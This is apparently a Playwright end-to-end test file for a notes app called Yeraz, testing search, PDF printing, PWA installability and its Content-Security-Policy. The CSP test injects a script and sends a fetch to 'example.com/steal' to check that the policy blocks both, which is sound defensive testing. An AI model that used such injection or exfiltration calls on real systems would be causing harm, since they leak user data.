// M4's checks (development-plan.md §6): title search, PDF export (print), the installable app.

import themes from '../design/themes/themes.json' with { type: 'json' }
import { expect, signIn, signInHere, test } from './fixtures'

const paperBg = themes.bases.paper.tokens.bg

test.describe('title search', () => {
  test('Ctrl/Cmd+K finds a leaf by title in any Tree and opens it', async ({
    page,
    graph,
    isMobile,
  }) => {
    const leaf = [...graph.nodes.values()]
      .filter((n) => n.kind === 'leaf')
      .sort((a, b) => b.title.length - a.title.length)[0]!
    await signIn(page)
    if (isMobile) await page.getByRole('button', { name: /Search leaves/ }).click()
    else await page.keyboard.press('ControlOrMeta+k')
    const box = page.getByRole('combobox', { name: 'Search titles and text' })
    await expect(box).toBeFocused()
    await box.fill(leaf.title.toUpperCase())
    await expect(page.getByRole('option').first()).toContainText(leaf.title)
    await box.press('Enter')
    await expect(page).toHaveURL(new RegExp(`#/tree/you/engineering/${leaf.id}$`))
    await expect(page.getByRole('heading', { name: leaf.title, level: 2 })).toBeVisible()
  })

  test('shows when nothing matches, and Escape closes it', async ({ page, isMobile }) => {
    test.skip(isMobile, 'Keyboard')
    await signIn(page)
    await page.keyboard.press('ControlOrMeta+k')
    await page.getByRole('combobox', { name: 'Search titles and text' }).fill('zzzz qqqq')
    await expect(page.getByText('Nothing matches.')).toBeVisible()
    await page.keyboard.press('Escape')
    await expect(page.getByRole('dialog', { name: 'Search' })).toHaveCount(0)
  })

  test('finds leaves by their text, with a snippet, and lights them on the map', async ({
    page,
    fake,
    isMobile,
  }) => {
    await fake.repo('you/engineering').commit({
      message: 'needles',
      additions: [
        {
          path: 'notes/haystack.md',
          contents: '# Haystack\n\nSomewhere in here is a zebrafish.\n',
        },
        { path: 'notes/pond.md', contents: '# Pond\n\nA Zebrafish swims.\n' },
      ],
    })
    await signIn(page)
    if (isMobile) await page.getByRole('button', { name: /Search leaves/ }).click()
    else await page.keyboard.press('ControlOrMeta+k')
    await page.getByRole('combobox', { name: 'Search titles and text' }).fill('zebrafish')
    const options = page.getByRole('option')
    await expect(options).toHaveCount(2)
    await expect(options.filter({ hasText: 'Haystack' })).toContainText('is a zebrafish.')
    await page.getByRole('button', { name: 'Light up 2 matches on the map' }).click()
    await expect(page.getByRole('dialog', { name: 'Search' })).toHaveCount(0)
    const map = page.locator('[data-map]')
    await expect(map).toHaveAttribute('data-focus')
    for (const id of ['notes/haystack.md', 'notes/pond.md'])
      await expect(map.locator(`[data-overlay] [data-node][data-id="${id}"]`)).toHaveAttribute(
        'data-match',
      )
    await page.getByRole('button', { name: 'Clear matches for “zebrafish”' }).click()
    await expect(map.locator('[data-overlay] [data-match]')).toHaveCount(0)
    await expect(map).not.toHaveAttribute('data-focus')
  })
})

test.describe('PDF export', () => {
  test('prints only the leaf, on Paper, with videos as links', async ({ page, fake }) => {
    await fake.repo('you/engineering').commit({
      message: 'printable',
      additions: [
        {
          path: 'printable.md',
          contents:
            '# Printable\n\nA paragraph to print.\n\n[The talk](https://www.youtube.com/watch?v=dQw4w9WgXcQ)\n',
        },
      ],
    })
    await page.goto('./#/tree/you/engineering/printable.md')
    await signInHere(page)
    // Vanta on screen; the print dialog is replaced by a flag.
    await page.evaluate(() => {
      ;(window as unknown as { printed: boolean }).printed = false
      window.print = () => void ((window as unknown as { printed: boolean }).printed = true)
    })
    await expect(page.getByText('A paragraph to print.')).toBeVisible()
    await page.getByRole('button', { name: 'Options' }).click()
    await page.getByRole('menuitem', { name: 'Export PDF' }).click()
    // The leaf is drawn for print first (the Peek shows it in the editor), then printed.
    await expect
      .poll(() => page.evaluate(() => (window as unknown as { printed: boolean }).printed))
      .toBe(true)

    await page.emulateMedia({ media: 'print' })
    const bg = await page.evaluate(() =>
      getComputedStyle(document.documentElement).getPropertyValue('--bg').trim(),
    )
    expect(bg).toBe(paperBg)
    const root = page.locator('#print-root')
    await expect(root).toBeVisible()
    await expect(root.getByRole('heading', { name: 'Printable' })).toBeVisible()
    await expect(root.getByText('A paragraph to print.')).toBeVisible()
    await expect(page.getByRole('banner')).toBeHidden()
    await expect(root.locator('iframe')).toBeHidden()
    await expect(root.getByRole('link', { name: /The talk · youtube\.com/ })).toBeVisible()

    await page.evaluate(() => window.dispatchEvent(new Event('afterprint')))
    await expect(root).toHaveCount(0)
  })
})

test.describe('installable app', () => {
  test('has a manifest with every icon, and a service worker that serves the shell offline', async ({
    page,
    context,
    browserName,
  }) => {
    test.skip(browserName !== 'chromium', 'Installability is checked in Chromium')
    await page.goto('./')
    const href = await page.locator('link[rel="manifest"]').getAttribute('href')
    const manifest = await (await page.request.get(new URL(href!, page.url()).href)).json()
    expect(manifest).toMatchObject({
      name: 'Yeraz',
      display: 'standalone',
      start_url: './',
      background_color: '#000000',
    })
    const icons = manifest.icons as { src: string; sizes: string; purpose: string }[]
    expect(icons.map((i) => `${i.sizes} ${i.purpose}`)).toEqual([
      '192x192 any',
      '512x512 any',
      '192x192 maskable',
      '512x512 maskable',
    ])
    for (const icon of icons)
      expect((await page.request.get(new URL(icon.src, page.url()).href)).status()).toBe(200)

    await page.evaluate(() => navigator.serviceWorker.ready)
    await context.setOffline(true)
    await page.reload()
    await expect(page.getByRole('heading', { name: 'Yeraz', level: 1 })).toBeVisible()
    await context.setOffline(false)
  })
})

test.describe('Content-Security-Policy', () => {
  test.use({ strictCsp: false })

  test('runs no script it wasn’t built with, and talks to GitHub only', async ({
    page,
    cspViolations,
  }) => {
    await signIn(page)
    const ran = await page.evaluate(async () => {
      const script = document.createElement('script')
      script.textContent = 'window.__injected = true'
      document.body.append(script)
      const sent = await fetch('https://example.com/steal').then(
        () => true,
        () => false,
      )
      return { script: 'injected' in window, sent }
    })
    expect(ran).toEqual({ script: false, sent: false })
    await expect
      .poll(() => cspViolations.map((v) => v.split(' ')[0]))
      .toEqual(expect.arrayContaining(['script-src-elem', 'connect-src']))
  })
})
